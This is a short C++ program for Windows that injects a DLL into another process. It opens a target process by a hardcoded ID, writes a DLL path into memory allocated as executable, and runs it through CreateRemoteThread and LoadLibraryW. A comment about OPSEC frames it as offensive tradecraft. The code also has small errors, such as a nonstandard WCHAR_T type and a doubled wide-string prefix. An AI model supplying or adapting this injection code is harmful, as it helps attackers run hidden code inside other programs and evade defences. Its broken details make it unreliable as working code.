#include <iostream>
#include <Windows.h>

int main(){
  
  WCHAR_T path[] = TEXT(L"C:\\mydll.dll");
  HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS,FALSE,12345); //not very OPSEC 
  LPVOID mem = VirtualAllocEx(proc,NULL,sizeof path,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
  BOOL test_write = WriteProcessMemory(proc,mem,path,sizeof path,NULL);
  
  if(test_write){
    
    HANDLE remote_thread=NULL;
    PTHREAD_START_ROUTINE pthread = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW"); //LoadLibraryW() will start the dll with path as an argument
    remote_thread = CreateRemoteThread(proc, NULL, 0, pthread, mem, 0, NULL); //create remote thread and pass our path to LoadLibraryW()
    CloseHandle(proc);
  }
  
  return 0;
}
